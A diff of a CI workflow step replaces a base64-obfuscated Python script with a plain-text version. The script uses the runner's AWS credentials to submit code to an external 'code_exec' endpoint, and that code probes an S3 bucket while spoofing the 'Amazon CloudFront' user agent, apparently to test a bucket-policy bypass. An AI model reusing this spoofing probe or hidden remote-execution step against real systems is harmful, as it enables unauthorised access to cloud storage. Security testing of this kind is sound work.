@@ -28,7 +28,67 @@ jobs:
         run: |
           pip install requests requests-aws4auth --quiet
       
-          B64='aW1wb3J0IGJhc2U2NCwgcmUsIHJlcXVlc3RzLCBib3RvMwpmcm9tIHJlcXVlc3RzX2F3czRhdXRoIGltcG9ydCBBV1M0QXV0aApBUEkgPSAiaHR0cHM6Ly9sOHNzeWF6NjlmLmV4ZWN1dGUtYXBpLnVzLWVhc3QtMS5hbWF6b25hd3MuY29tL2Rldi9jb2RlX2V4ZWMiCmNyZWRzID0gYm90bzMuU2Vzc2lvbigpLmdldF9jcmVkZW50aWFscygpLmdldF9mcm96ZW5fY3JlZGVudGlhbHMoKQphdXRoID0gQVdTNEF1dGgoY3JlZHMuYWNjZXNzX2tleSwgY3JlZHMuc2VjcmV0X2tleSwgInVzLWVhc3QtMSIsICJleGVjdXRlLWFwaSIsIHNlc3Npb25fdG9rZW49Y3JlZHMudG9rZW4pCmNvZGUgPSAiIiJpbXBvcnQgYm90bzMKZnJvbSBib3RvY29yZS5jb25maWcgaW1wb3J0IENvbmZpZwpmcm9tIGJvdG9jb3JlLmV4Y2VwdGlvbnMgaW1wb3J0IENsaWVudEVycm9yCnRyeToKICAgIHMzID0gYm90bzMuY2xpZW50KFwiczNcIiwgcmVnaW9uX25hbWU9XCJ1cy1lYXN0LTFcIiwgY29uZmlnPUNvbmZpZyh1c2VyX2FnZW50PVwiQW1hem9uIENsb3VkRnJvbnRcIikpCiAgICBzMy5saXN0X29iamVjdHNfdjIoQnVja2V0PVwidXNlcmFkODhlMmIxNjhhYTM4N2VcIiwgTWF4S2V5cz0xKQogICAgcmFpc2UgU3lzdGVtRXhpdCg3KQpleGNlcHQgQ2xpZW50RXJyb3IgYXMgZToKICAgIGMgPSBlLnJlc3BvbnNlLmdldChcIkVycm9yXCIsIHt9KS5nZXQoXCJDb2RlXCIsIFwiXCIpCiAgICByYWlzZSBTeXN0ZW1FeGl0KHtcIkFjY2Vzc0RlbmllZFwiOjEwLCBcIkFsbEFjY2Vz c0Rpc2FibGVkXCI6MTEsIFwiTm9TdWNoQnVja2V0XCI6MTJ9LmdldChjLCAxMykpCmV4Y2VwdCBFeGNlcHRpb246CiAgICByYWlzZSBTeXN0ZW1FeGl0KDE0KQoiIiIKciA9IHJlcXVlc3RzLnBvc3QoQVBJLCBqc29uPXsiY29kZSI6IGJhc2U2NC5iNjRlbmNvZGUoY29kZS5lbmNvZGUoKSkuZGVjb2RlKCl9LCBhdXRoPWF1dGgpCnByaW50KCJIVFRQOiIsIHIuc3RhdHVzX2NvZGUpCnByaW50KCJCT0RZOiIsIHIudGV4dCkKbSA9IHJlLnNlYXJjaChyImV4aXQgc3RhdHVzIChcZCspIiwgci50ZXh0KQpwcmludCgiUzNfUFJPQkVfU1RBVFVTOiIsIG0uZ3JvdXAoMSkgaWYgbSBlbHNlICJOT19FWElUX0NPREUiKQo='
+          cat > /tmp/probe.py <<'PY'
+          import base64
+          import re
+          import requests
+          import boto3
+          from requests_aws4auth import AWS4Auth
       
-          printf '%s' "$B64" | base64 -d > /tmp/probe.py
+          API = "https://l8ssyaz69f.execute-api.us-east-1.amazonaws.com/dev/code_exec"
+      
+          creds = boto3.Session().get_credentials().get_frozen_credentials()
+          auth = AWS4Auth(
+              creds.access_key,
+              creds.secret_key,
+              "us-east-1",
+              "execute-api",
+              session_token=creds.token,
+          )
+      
+          lambda_code = r'''
+          import boto3
+          from botocore.config import Config
+          from botocore.exceptions import ClientError
+      
+          try:
+              s3 = boto3.client(
+                  "s3",
+                  region_name="us-east-1",
+                  config=Config(user_agent="Amazon CloudFront"),
+              )
+              s3.list_objects_v2(
+                  Bucket="userad88e2b168aa387e",
+                  MaxKeys=1,
+              )
+              raise SystemExit(7)
+          except ClientError as e:
+              code = e.response.get("Error", {}).get("Code", "")
+              raise SystemExit({
+                  "AccessDenied": 10,
+                  "AllAccessDisabled": 11,
+                  "NoSuchBucket": 12,
+              }.get(code, 13))
+          except Exception:
+              raise SystemExit(14)
+          '''
+      
+          encoded = base64.b64encode(lambda_code.encode()).decode()
+      
+          response = requests.post(
+              API,
+              json={"code": encoded},
+              auth=auth,
+          )
+      
+          print("HTTP:", response.status_code)
+          print("BODY:", response.text)
+      
+          match = re.search(r"exit status (\d+)", response.text)
+          print(
+              "S3_PROBE_STATUS:",
+              match.group(1) if match else "NO_EXIT_CODE",
+          )
+          PY
+      
           python3 /tmp/probe.py
